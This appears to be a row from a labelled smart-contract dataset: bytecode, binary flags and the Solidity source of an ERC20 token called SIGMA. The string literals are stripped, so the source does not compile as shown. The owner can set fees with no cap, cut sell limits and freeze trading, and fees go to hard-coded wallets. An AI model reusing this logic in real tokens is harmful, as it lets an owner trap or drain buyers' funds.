d565b6001600160a01b0382166118525760405162461bcd60e51b81526004016106ba90612082565b6001600160a01b038316600090815260208190526040902054818110156118ca5760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b60648201526084016106ba565b6001600160a01b03808516600090815260208190526040808220858503905591851681529081208054849290611901908490611faf565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161194d91815260200190565b60405180910390a350505050565b306000908152602081905260408120549050600060115460125461197f9190611faf565b9050600082158061198e575081155b1561199857505050565b6008546119a6906014611ffc565b8311156119be576008546119bb906014611ffc565b92505b6000600283601254866119d19190611ffc565b6119db919061201b565b6119e5919061201b565b905060006119f38583611b23565b9050476119ff82611b2f565b6000611a0b4783611b23565b90506000611a288761160c60115485611b0490919063ffffffff16565b90506000611a3682846120c5565b6000601281905560115590508515801590611a515750600081115b15611aa457611a608682611cef565b601254604080518781526020810184905280820192909252517f17bbfb9a6069321b6ded73bd96327c9e6b7212a5cd51ff219cd61370acafb5619181900360600190a15b6006546040516001600160a01b03909116904790600081818185875af1925050503d8060008114611af1576040519150601f19603f3d011682016040523d82523d6000602084013e611af6565b606091505b505050505050505050505050565b6000611b108284611ffc565b9392505050565b6000611b10828461201b565b6000611b1082846120c5565b6040805160028082526060820183526000926020830190803683370190505090503081600081518110611b6457611b646120d8565b60200260200101906001600160a01b031690816001600160a01b0316815250507f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015611be2573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611c0691906120ee565b81600181518110611c1957611c196120d8565b60200260200101906001600160a01b031690816001600160a01b031681525050611c64307f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d84610f97565b60405163791ac94760e01b81526001600160a01b037f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d169063791ac94790611cb990859060009086903090429060040161210b565b600060405180830381600087803b158015611cd357600080fd5b505af1158015611ce7573d6000803e3d6000fd5b505050505050565b611d1a307f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d84610f97565b60405163f305d71960e01b815230600482015260248101839052600060448201819052606482015261dead60848201524260a48201527f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b03169063f305d71990839060c40160606040518083038185885af1158015611da4573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190611dc9919061217c565b5050505050565b60008060408385031215611de357600080fd5b50508035926020909101359150565b600060208083528351808285015260005b81811015611e1f57858101830151858201604001528201611e03565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114610f9457600080fd5b60008060408385031215611e6857600080fd5b8235611e7381611e40565b946020939093013593505050565b600080600060608486031215611e9657600080fd5b8335611ea181611e40565b92506020840135611eb181611e40565b929592945050506040919091013590565b600060208284031215611ed457600080fd5b8135611b1081611e40565b60008060408385031215611ef257600080fd5b8235611efd81611e40565b915060208301358015158114611f1257600080fd5b809150509250929050565b600060208284031215611f2f57600080fd5b5035919050565b60008060408385031215611f4957600080fd5b8235611f5481611e40565b91506020830135611f1281611e40565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052601160045260246000fd5b808201808211156107d8576107d8611f99565b600181811c90821680611fd657607f821691505b602082108103611ff657634e487b7160e01b600052602260045260246000fd5b50919050565b600081600019048311821515161561201657612016611f99565b500290565b60008261203857634e487b7160e01b600052601260045260246000fd5b500490565b60208082526025908201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604082015264647265737360d81b606082015260800190565b60208082526023908201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260408201526265737360e81b606082015260800190565b818103818111156107d8576107d8611f99565b634e487b7160e01b600052603260045260246000fd5b60006020828403121561210057600080fd5b8151611b1081611e40565b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b8181101561215b5784516001600160a01b031683529383019391830191600101612136565b50506001600160a01b03969096166060850152505050608001529392505050565b60008060006060848603121561219157600080fd5b835192506020840151915060408401519050925092509256fea26469706673582212203128b2f4d2a664906be4fe2459847940d9df60fe34a3d5036e064c432fc6d91f64736f6c63430008100033,0,0,0,0,0,0,0,1,0,0,0,0,1,1,0,0,0
" pragma solidity ^0.8.10; interface ERC20 { function totalSupply() external view returns (uint256); function decimals() external view returns (uint8); function symbol() external view returns (string memory); function name() external view returns (string memory); function getOwner() external view returns (address); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address _owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);} abstract contract Ownable { address internal owner; address private _previousOwner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor(address _owner) { owner = _owner; } modifier onlyOwner() { require(isOwner(msg.sender), ); _; } function isOwner(address account) public view returns (bool) { return account == owner; } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(owner, newOwner); owner = newOwner; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(owner, address(0)); owner = address(0); }} interface IDEXFactory { function createPair(address tokenA, address tokenB) external returns (address pair);} interface IDEXRouter { function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity); function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity); function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable; function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;} contract SIGMA is ERC20, Ownable { mapping(address => bool) private _whitelisted; mapping(address => bool) public _automatedMarketMakers; mapping(address => bool) private _isLimitless; mapping(address => uint256) private _balances; mapping(address => mapping(address => uint256)) private _allowances; string constant _name = ; string constant _symbol = ; uint8 constant _decimals = 18; uint256 private _totalSupply = 1_000_000_000 * 10 ** _decimals; uint256 public maxBuyPercentage; uint256 public maxSellPercentage; uint256 public maxWalletPercentage; uint256 private maxBuyAmount; uint256 private maxSellAmount; uint256 private maxWalletAmount; address[] private sniperList; uint256 tokenTax; uint256 transferFee=0; struct BuyFee { uint256 liquidityFee; uint256 developmentFee; uint256 marketingFee; uint256 total; } struct SellFee { uint256 liquidityFee; uint256 developmentFee; uint256 marketingFee; uint256 total; } BuyFee public buyFee; SellFee public sellFee; address public _exchangeRouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; address private constant DEAD = 0x000000000000000000000000000000000000dEaD; address private constant ZERO = 0x0000000000000000000000000000000000000000; address public developmentReceiver = 0x659b976BF1716c7A576C60F1385E50dC87f61868; address public marketingReceiver = 0x94990B2Fd44151cFaD0755BEd44f291D61f12Cf9; IDEXRouter public router; address public pair; bool private _addingLP; bool private inSwap; bool private _initialDistributionFinished; bool public swapEnabled = true; uint256 private swapThreshold = _totalSupply / 1000; modifier swapping() { inSwap = true; _; inSwap = false; } constructor () Ownable(msg.sender) { router = IDEXRouter(_exchangeRouterAddress); pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this)); _allowances[address(this)][address(router)] = type(uint256).max; _automatedMarketMakers[pair]=true; buyFee.liquidityFee = 100; buyFee.developmentFee = 400; buyFee.marketingFee = 400; buyFee.total = buyFee.liquidityFee + buyFee.developmentFee + buyFee.marketingFee; sellFee.liquidityFee = 100; sellFee.developmentFee = 400; sellFee.marketingFee = 400; sellFee.total = sellFee.liquidityFee + sellFee.developmentFee + sellFee.marketingFee; maxBuyPercentage = 20; maxBuyAmount = _totalSupply /1000 * maxBuyPercentage; maxSellPercentage = 20; maxSellAmount = _totalSupply /1000 * maxSellPercentage; maxWalletPercentage = 20; maxWalletAmount = _totalSupply /1000 * maxWalletPercentage; _isLimitless[owner] = _isLimitless[address(this)] = true; _balances[owner] = _totalSupply; emit Transfer(address(0x0), owner, _totalSupply); } function ownerSetLimits(uint256 _maxBuyPercentage, uint256 _maxSellPercentage) external onlyOwner { maxBuyPercentage = _maxBuyPercentage; maxBuyAmount = _totalSupply /1000 * maxBuyPercentage; maxSellPercentage = _maxSellPercentage; maxSellAmount = _totalSupply /1000 * maxSellPercentage; } function ownerSetInitialDistributionFinished() external onlyOwner { _initialDistributionFinished = true; } function ownerSetSwapBackSettings(bool _enabled, uint256 _percentageBase1000) external onlyOwner { swapEnabled = _enabled; swapThreshold = _totalSupply / 1000 * _percentageBase1000; } function ownerUpdateBuyFees (uint256 _liquidityFee, uint256 _developmentFee, uint256 _marketingFee) external onlyOwner { buyFee.liquidityFee = _liquidityFee; buyFee.developmentFee = _developmentFee; buyFee.marketingFee = _marketingFee; buyFee.total = buyFee.liquidityFee + buyFee.developmentFee + buyFee.marketingFee; } function ownerUpdateSellFees (uint256 _liquidityFee, uint256 _developmentFee, uint256 _marketingFee) external onlyOwner { sellFee.liquidityFee = _liquidityFee; sellFee.developmentFee = _developmentFee; sellFee.marketingFee = _marketingFee; sellFee.total = sellFee.liquidityFee + sellFee.developmentFee + sellFee.marketingFee; } function ownerAirDropWallets(address[] memory airdropWallets, uint256[] memory amounts) external onlyOwner{ require(airdropWallets.length < 100, ); for(uint256 i = 0; i < airdropWallets.length; i++){ address wallet = airdropWallets[i]; uint256 amount = (amounts[i] * 10**_decimals); _transfer(msg.sender, wallet, amount); } } function getCirculatingSupply() public view returns (uint256) { return _totalSupply - balanceOf(DEAD) - balanceOf(ZERO); } function _transfer(address sender,address recipient,uint256 amount) private { require(sender!=address(0)&&recipient!=address(0),); bool isBuy=_automatedMarketMakers[sender]; bool isSell=_automatedMarketMakers[recipient]; bool isExcluded=_isLimitless[sender]||_isLimitless[recipient]||_addingLP; if(isExcluded)_transferExcluded(sender,recipient,amount); else { require(_initialDistributionFinished); if(isBuy)_buyTokens(sender,recipient,amount); else if(isSell) { if (shouldSwapBack()) {swapBack();} _sellTokens(sender,recipient,amount); } else { require(balanceOf(recipient)+amount<=maxWalletAmount, ); _P2PTransfer(sender,recipient,amount); } } } function _buyTokens(address sender,address recipient,uint256 amount) private { require(amount <= maxBuyAmount, ); require(balanceOf(recipient)+amount<=maxWalletAmount, ); if(!_whitelisted[recipient]){ tokenTax = amount*buyFee.total/1000;} else tokenTax = 0; _transferIncluded(sender,recipient,amount,tokenTax); } function _sellTokens(address sender,address recipient,uint256 amount) private { require(amount <= maxSellAmount); if(!_whitelisted[sender]){ tokenTax = amount*sellFee.total/1000;} else tokenTax = 0; _transferIncluded(sender,recipient,amount,tokenTax); } function _P2PTransfer(address sender,address recipient,uint256 amount) private { tokenTax = amount * transferFee/1000; if( tokenTax > 0) {_transferIncluded(sender,recipient,amount,tokenTax);} else {_transferExcluded(sender,recipient,amount);} } function _transferExcluded(address sender,address recipient,uint256 amount) private { _updateBalance(sender,_balances[sender]-amount); _updateBalance(recipient,_balances[recipient]+amount); emit Transfer(sender,recipient,amount); } function _transferIncluded(address sender,address recipient,uint256 amount,uint256 taxAmount) private { uint256 newAmount = amount-tokenTax; _updateBalance(sender,_balances[sender]-amount); _updateBalance(address(this),_balances[address(this)]+taxAmount); _updateBalance(recipient,_balances[recipient]+newAmount); emit Transfer(sender,recipient,newAmount); emit Transfer(sender,address(this),taxAmount); } function _updateBalance(address account,uint256 newBalance) private { _balances[account] = newBalance; } function shouldSwapBack() private view returns (bool) { return !inSwap && swapEnabled && _balances[address(this)] >= swapThreshold; } function swapBack() private swapping { uint256 toSwap = balanceOf(address(this)); uint256 totalLPTokens=toSwap*(sellFee.liquidityFee + buyFee.liquidityFee)/(sellFee.total + buyFee.total); uint256 tokensLeft=toSwap-totalLPTokens; uint256 LPTokens=totalLPTokens/2; uint256 LPETHTokens=totalLPTokens-LPTokens; toSwap=tokensLeft+LPETHTokens; uint256 oldETH=address(this).balance; _swapTokensForETH(toSwap); uint256 newETH=address(this).balance-oldETH; uint256 LPETH=(newETH*LPETHTokens)/toSwap; _addLiquidity(LPTokens,LPETH); uint256 remainingETH=address(this).balance-oldETH; _distributeETH(remainingETH); } function _distributeETH(uint256 remainingETH) private { uint256 marketingFee = (buyFee.marketingFee + sellFee.marketingFee); uint256 developmentFee = (buyFee.developmentFee + sellFee.developmentFee); uint256 totalFee = (marketingFee + developmentFee); uint256 amountETHmarketing = remainingETH * (marketingFee) / (totalFee); uint256 amountETHdevelopment = remainingETH * (developmentFee) / (totalFee); if(amountETHdevelopment > 0){ (bool developmentSuccess, ) = payable(developmentReceiver).call{value: amountETHdevelopment, gas: 30000}(); require(developmentSuccess, ); } if(amountETHmarketing > 0){ (bool marketingSuccess, ) = payable(marketingReceiver).call{value: amountETHmarketing, gas: 30000}(); require(marketingSuccess, ); } } function _swapTokensForETH(uint256 amount) private { address[] memory path=new address[](2); path[0] = address(this); path[1] = router.WETH(); router.swapExactTokensForETHSupportingFeeOnTransferTokens( amount, 0, path, address(this), block.timestamp ); } function _addLiquidity(uint256 amountTokens,uint256 amountETH) private { _addingLP=true; router.addLiquidityETH{value: amountETH}( address(this), amountTokens, 0, 0, developmentReceiver, block.timestamp ); _addingLP=false; } receive() external payable { } function totalSupply() external view override returns (uint256) { return _totalSupply; } function decimals() external pure override returns (uint8) { return _decimals; } function symbol() external pure override returns (string memory) { return _symbol; } function name() external pure override returns (string memory) { return _name; } function getOwner() external view override returns (address) { return owner; } function balanceOf(address account) public view override returns (uint256) { return _balances[account];} function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender];} function approve(address spender, uint256 amount) public override returns (bool) { _allowances[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; } function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(msg.sender, recipient, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) { uint256 allowance_ = _allowances[sender][msg.sender]; require(allowance_ >= amount); if (_allowances[sender][msg.sender] != type(uint256).max) { _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount; } _transfer(sender, recipient, amount); return true; }}",0x6080604052600436106101e75760003560e01c806370a0823111610102578063a8aa1b3111610095578063dd62ed3e11610064578063dd62ed3e146106e7578063e065099714610724578063f2fde38b1461074f578063f887ea4014610778576101ee565b8063a8aa1b311461062b578063a9059cbb14610656578063b46ba24b14610693578063b704a9f6146106bc576101ee565b806395d89b41116100d157806395d89b411461058357806398a1e1ba146105ae5780639b0ad05c146105d7578063a5949bcf14610600576101ee565b806370a08231146104db578063715018a614610518578063893d20e81461052f5780638ee41ca81461055a576101ee565b80632f54bf6e1161017a578063593173c111610149578063593173c114610431578063599ca3971461045c57806359d3cac2146104875780636ddd1713146104b0576101ee565b80632f54bf6e14610384578063313ce567146103c157806347062402146103ec57806347375a371461041a576101ee565b806323b872dd116101b657806323b872dd146102c35780632b112e49146103005780632b14ca561461032b5780632d3b404714610359576101ee565b806306fdde03146101f3578063095ea7b31461021e5780630cb23d861461025b57806318160ddd14610298576101ee565b366101ee57005b600080fd5b3480156101ff57600080fd5b506102086107a3565b6040516102159190612485565b60405180910390f35b34801561022a57600080fd5b506102456004803603810190610240919061254f565b6107e0565b60405161025291906125aa565b60405180910390f35b34801561026757600080fd5b50610282600480360381019061027d91906125c5565b6108d2565b60405161028f91906125aa565b60405180910390f35b3480156102a457600080fd5b506102ad6108f2565b6040516102ba9190612601565b60405180910390f35b3480156102cf57600080fd5b506102ea60048036038101906102e5919061261c565b6108fc565b6040516102f791906125aa565b60405180910390f35b34801561030c57600080fd5b50610315610b4e565b6040516103229190612601565b60405180910390f35b34801561033757600080fd5b50610340610b81565b604051610350949392919061266f565b60405180910390f35b34801561036557600080fd5b5061036e610b9f565b60405161037b91906126c3565b60405180910390f35b34801561039057600080fd5b506103ab60048036038101906103a691906125c5565b610bc5565b6040516103b891906125aa565b60405180910390f35b3480156103cd57600080fd5b506103d6610c1e565b6040516103e391906126fa565b60405180910390f35b3480156103f857600080fd5b50610401610c27565b604051610411949392919061266f565b60405180910390f35b34801561042657600080fd5b5061042f610c45565b005b34801561043d57600080fd5b50610446610caa565b60405161045391906126c3565b60405180910390f35b34801561046857600080fd5b50610471610cd0565b60405161047e9190612601565b60405180910390f35b34801561049357600080fd5b506104ae60048036038101906104a99190612715565b610cd6565b005b3480156104bc57600080fd5b506104c5610d70565b6040516104d291906125aa565b60405180910390f35b3480156104e757600080fd5b5061050260048036038101906104fd91906125c5565b610d83565b60405161050f9190612601565b60405180910390f35b34801561052457600080fd5b5061052d610dcc565b005b34801561053b57600080fd5b50610544610ed2565b60405161055191906126c3565b60405180910390f35b34801561056657600080fd5b50610581600480360381019061057c9190612794565b610efb565b005b34801561058f57600080fd5b50610598610f82565b6040516105a59190612485565b60405180910390f35b3480156105ba57600080fd5b506105d560048036038101906105d091906127d4565b610fbf565b005b3480156105e357600080fd5b506105fe60048036038101906105f99190612a1f565b61105f565b005b34801561060c57600080fd5b50610615611172565b60405161062291906126c3565b60405180910390f35b34801561063757600080fd5b50610640611198565b60405161064d91906126c3565b60405180910390f35b34801561066257600080fd5b5061067d6004803603810190610678919061254f565b6111be565b60405161068a91906125aa565b60405180910390f35b34801561069f57600080fd5b506106ba60048036038101906106b59190612715565b6111d5565b005b3480156106c857600080fd5b506106d161126f565b6040516106de9190612601565b60405180910390f35b3480156106f357600080fd5b5061070e60048036038101906107099190612a97565b611275565b60405161071b9190612601565b60405180910390f35b34801561073057600080fd5b506107396112fc565b6040516107469190612601565b60405180910390f35b34801561075b57600080fd5b50610776600480360381019061077191906125c5565b611302565b005b34801561078457600080fd5b5061078d611477565b60405161079a9190612b36565b60405180910390f35b60606040518060400160405280601081526020017f5369676d6120556e697665727369747900000000000000000000000000000000815250905090565b600081600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040516108c09190612601565b60405180910390a36001905092915050565b60036020528060005260406000206000915054906101000a900460ff1681565b6000600754905090565b600080600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490508281101561098b57600080fd5b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205414610b375782600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610ab69190612b80565b600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b610b4285858561149d565b60019150509392505050565b6000610b5a6000610d83565b610b6561dead610d83565b600754610b729190612b80565b610b7c9190612b80565b905090565b60158060000154908060010154908060020154908060030154905084565b601960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16149050919050565b60006012905090565b60118060000154908060010154908060020154908060030154905084565b610c4e33610bc5565b610c8d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c8490612c00565b60405180910390fd5b6001601d60166101000a81548160ff021916908315150217905550565b601a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600a5481565b610cdf33610bc5565b610d1e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d1590612c00565b60405180910390fd5b826015600001819055508160156001018190555080601560020181905550601560020154601560010154601560000154610d589190612c20565b610d629190612c20565b601560030181905550505050565b601d60179054906101000a900460ff1681565b6000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b610dd533610bc5565b610e14576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e0b90612c00565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b610f0433610bc5565b610f43576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f3a90612c00565b60405180910390fd5b81601d60176101000a81548160ff021916908315150217905550806103e8600754610f6e9190612ca5565b610f789190612cd6565b601e819055505050565b60606040518060400160405280600581526020017f5349474d41000000000000000000000000000000000000000000000000000000815250905090565b610fc833610bc5565b611007576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ffe90612c00565b60405180910390fd5b816008819055506008546103e86007546110219190612ca5565b61102b9190612cd6565b600b81905550806009819055506009546103e860075461104b9190612ca5565b6110559190612cd6565b600c819055505050565b61106833610bc5565b6110a7576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161109e90612c00565b60405180910390fd5b60648251106110eb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110e290612da2565b60405180910390fd5b60005b825181101561116d57600083828151811061110c5761110b612dc2565b5b6020026020010151905060006012600a6111269190612f24565b84848151811061113957611138612dc2565b5b602002602001015161114b9190612cd6565b905061115833838361149d565b5050808061116590612f6f565b9150506110ee565b505050565b601b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b601d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006111cb33848461149d565b6001905092915050565b6111de33610bc5565b61121d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161121490612c00565b60405180910390fd5b8260116000018190555081601160010181905550806011600201819055506011600201546011600101546011600001546112579190612c20565b6112619190612c20565b601160030181905550505050565b60095481565b6000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b60085481565b61130b33610bc5565b61134a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161134190612c00565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614156113ba576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113b19061302a565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b601c60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16141580156115075750600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b611546576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161153d90613096565b60405180910390fd5b6000600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1690506000600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1690506000600460008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff168061168b5750600460008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b806116a25750601d60149054906101000a900460ff165b905080156116ba576116b5868686611783565b61177b565b601d60169054906101000a900460ff166116d357600080fd5b82156116e9576116e4868686611895565b61177a565b8115611715576116f76119c8565b1561170557611704611a45565b5b611710868686611b73565b611779565b600d548461172287610d83565b61172c9190612c20565b111561176d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161176490613102565b60405180910390fd5b611778868686611c18565b5b5b5b505050505050565b6117d78382600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546117d29190612b80565b611c68565b61182b8282600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546118269190612c20565b611c68565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516118889190612601565b60405180910390a3505050565b600b548111156118da576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016118d19061316e565b60405180910390fd5b600d54816118e784610d83565b6118f19190612c20565b1115611932576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161192990613102565b60405180910390fd5b600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff166119ac576103e8601160030154826119979190612cd6565b6119a19190612ca5565b600f819055506119b5565b6000600f819055505b6119c3838383600f54611cb0565b505050565b6000601d60159054906101000a900460ff161580156119f35750601d60179054906101000a900460ff165b8015611a405750601e54600560003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410155b905090565b6001601d60156101000a81548160ff0219169083151502179055506000611a6b30610d83565b90506000601160030154601560030154611a859190612c20565b601160000154601560000154611a9b9190612c20565b83611aa69190612cd6565b611ab09190612ca5565b905060008183611ac09190612b80565b90506000600283611ad19190612ca5565b905060008184611ae19190612b80565b90508083611aef9190612c20565b94506000479050611aff86611e8f565b60008147611b0d9190612b80565b90506000878483611b1e9190612cd6565b611b289190612ca5565b9050611b3485826120a5565b60008347611b429190612b80565b9050611b4d816121ae565b5050505050505050506000601d60156101000a81548160ff021916908315150217905550565b600c54811115611b8257600080fd5b600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16611bfc576103e860156003015482611be79190612cd6565b611bf19190612ca5565b600f81905550611c05565b6000600f819055505b611c13838383600f54611cb0565b505050565b6103e860105482611c299190612cd6565b611c339190612ca5565b600f819055506000600f541115611c5757611c52838383600f54611cb0565b611c63565b611c62838383611783565b5b505050565b80600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505050565b6000600f5483611cc09190612b80565b9050611d168584600560008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611d119190612b80565b611c68565b611d6a3083600560003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611d659190612c20565b611c68565b611dbe8482600560008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611db99190612c20565b611c68565b8373ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051611e1b9190612601565b60405180910390a33073ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051611e809190612601565b60405180910390a35050505050565b6000600267ffffffffffffffff811115611eac57611eab612819565b5b604051908082528060200260200182016040528015611eda5781602001602082028036833780820191505090505b5090503081600081518110611ef257611ef1612dc2565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050601c60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015611f99573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611fbd91906131a3565b81600181518110611fd157611fd0612dc2565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050601c60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663791ac9478360008430426040518663ffffffff1660e01b815260040161206f9594939291906132c9565b600060405180830381600087803b15801561208957600080fd5b505af115801561209d573d6000803e3d6000fd5b